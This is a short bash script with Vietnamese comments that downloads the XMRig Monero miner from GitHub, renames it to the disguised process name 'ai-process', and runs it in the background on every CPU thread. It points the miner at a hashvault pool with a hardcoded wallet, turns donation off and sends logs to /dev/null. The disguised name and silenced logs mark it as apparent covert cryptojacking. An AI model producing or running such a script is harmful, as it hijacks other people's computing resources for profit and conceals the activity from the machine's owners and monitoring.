#!/bin/bash

FAKE_NAME="ai-process"
POOL_URL="pool.hashvault.pro:443"
WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"

# Tải XMrig nếu chưa có
if [ ! -f "./xmrig" ]; then
    echo "[*] Đang tải XMrig..."
    curl -L -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
    tar -xf xmrig.tar.gz
    mv xmrig-*/xmrig . && chmod +x xmrig
    rm -rf xmrig-*
fi

# Đổi tên giả và phân quyền
cp xmrig $FAKE_NAME
chmod +x $FAKE_NAME

# Sử dụng toàn bộ luồng CPU
CORES_TO_USE=$(nproc)

echo "[*] Đang chạy tiến trình '$FAKE_NAME' sử dụng $CORES_TO_USE luồng CPU..."

# Chạy miner với full CPU, tắt donate, log nhẹ để không làm chậm
./$FAKE_NAME -o $POOL_URL -u $WALLET -k --tls --donate-level 0 --cpu-max-threads-hint=$CORES_TO_USE --randomx-1gb-pages --randomx-no-numa --threads=$CORES_TO_USE --log-file=/dev/null &

# Giữ script sống
while true; do sleep 60; done
